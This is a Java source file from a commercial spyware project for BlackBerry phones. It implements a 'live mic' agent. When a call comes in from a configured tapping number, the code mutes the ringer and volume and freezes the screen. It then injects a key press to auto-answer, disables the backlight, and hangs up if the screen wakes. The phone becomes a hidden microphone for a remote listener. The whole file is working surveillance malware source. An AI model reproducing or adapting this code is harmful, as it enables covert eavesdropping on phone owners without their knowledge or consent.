//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : LiveMicAgent.java
 * Created      : 2-lug-2010
 * *************************************************/
package blackberry.agent;

import java.io.EOFException;

import net.rim.device.api.system.Alert;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.Audio;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.Conf;
import blackberry.injection.KeyInjector;
import blackberry.injection.MenuWalker;
import blackberry.interfaces.BacklightObserver;
import blackberry.interfaces.PhoneCallObserver;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * The Class LiveMicAgent.
 */
public class LiveMicAgent extends Agent implements PhoneCallObserver,
        BacklightObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("LiveMicAgent", DebugLevel.VERBOSE);
    //#endif

    String number;
    int volume;
    boolean autoanswer;
    boolean suspended;

    /**
     * Instantiates a new live mic agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public LiveMicAgent(final boolean agentStatus) {
        super(Agent.AGENT_LIVE_MIC, agentStatus, Conf.AGENT_LIVEMIC_ON_SD,
                "LiveMicAgent");
        //#ifdef DBC
        Check.asserts(Log.convertTypeLog(agentId) == LogType.NONE,
                "Wrong Conversion");
        //#endif
    }

    /**
     * Instantiates a new live mic agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    public LiveMicAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);
        try {
            final int len = databuffer.readInt();
            final byte[] array = new byte[len];
            databuffer.read(array);
            number = WChar.getString(array, true);

        } catch (final EOFException e) {
            return false;
        }

        //#ifdef DEBUG_INFO
        debug.info("Tapping number: " + number);
        //#endif
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    protected void actualStart() {
        AppListener.getInstance().addPhoneCallObserver(this);
        AppListener.getInstance().addBacklightObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    protected void actualStop() {
        AppListener.getInstance().removePhoneCallObserver(this);
        AppListener.getInstance().removeBacklightObserver(this);
        
        suspendPainting(false);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.PhoneCallObserver#onCallAnswered(java.lang.String)
     */
    public void onCallAnswered(final String phoneNumber) {
        //#ifdef DEBUG_INFO
        debug.info("callAnswered: " + phoneNumber);
        //#endif

        if (!interestingNumber(phoneNumber)) {
            return;
        }
                
        //MenuWalker.walk(new String[] { "Activate Speakerphone" });
        MenuWalker.walk(new String[] { "Home Screen",  "Return to Phone" });
       
        //MenuWalker.walk(new String[] { "Close" });
        MenuWalker.walk(new String[] { "Return to Phone" });
        
        //#ifdef DEBUG_TRACE
        debug.trace("onCallAnswered: finished");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.PhoneCallObserver#onCallConnected(java.lang.String)
     */
    public void onCallConnected(final String phoneNumber) {
        //#ifdef DEBUG_INFO
        debug.info("callConnected: " + phoneNumber);
        //#endif      
        
        if (!interestingNumber(phoneNumber)) {
            return;
        }
        
        suspendPainting(false);
        Backlight.enable(false);
    }

    private boolean interestingNumber(final String phoneNumber) {
        if (!phoneNumber.endsWith(number)) {
            //#ifdef DEBUG_TRACE
            debug.trace("onCallIncoming, don't tap: " + phoneNumber + " != "
                    + number);
            //#endif
            return false;
        }
        
        return true;
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.PhoneCallObserver#onCallDisconnected(java.lang.
     * String)
     */
    public void onCallDisconnected(final String phoneNumber) {
        //#ifdef DEBUG_INFO
        debug.info("callDisconnected: " + phoneNumber);
        //#endif

        if (!interestingNumber(phoneNumber)) {
            return;
        }
        
        suspendPainting(false);
        autoanswer = false;
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.PhoneCallObserver#onCallIncoming(java.lang.String)
     */
    public void onCallIncoming(final String phoneNumber) {
        //#ifdef DEBUG_INFO
        debug.info("answering: " + phoneNumber);
        //#endif
        
        if (!interestingNumber(phoneNumber)) {
            return;
        }
      
        volume = Alert.getVolume();
        Alert.setBuzzerVolume(0);
        Audio.setVolume(0);

        autoanswer = true;
        suspendPainting(true);

        KeyInjector.pressKey(Keypad.KEY_SEND);

    }

    /*
     * (non-Javadoc)
     * @see blackberry.interfaces.BacklightObserver#onBacklightChange(boolean)
     */
    public void onBacklightChange(final boolean statusOn) {
        if (autoanswer && statusOn) {
            //#ifdef DEBUG_TRACE
            debug.trace("onBacklightChange: sending END");
            //#endif
            suspendPainting(true);

            KeyInjector.pressKey(Keypad.KEY_END);
            //Utils.sleep(2000);

            suspendPainting(false);
        }
    }

    /**
     * Suspend/resume painting.
     * 
     * @param suspend
     *            true if you ask to suspend
     */
    private void suspendPainting(final boolean suspend) {
        synchronized (Application.getEventLock()) {
            if (suspended != suspend) {
                try {
                    UiApplication.getUiApplication().suspendPainting(suspend);
                } catch (IllegalStateException ex) {
                    //#ifdef DEBUG_ERROR
                    debug.error(ex);
                    //#endif
                }
                suspended = suspend;
            }
        }
    }
}
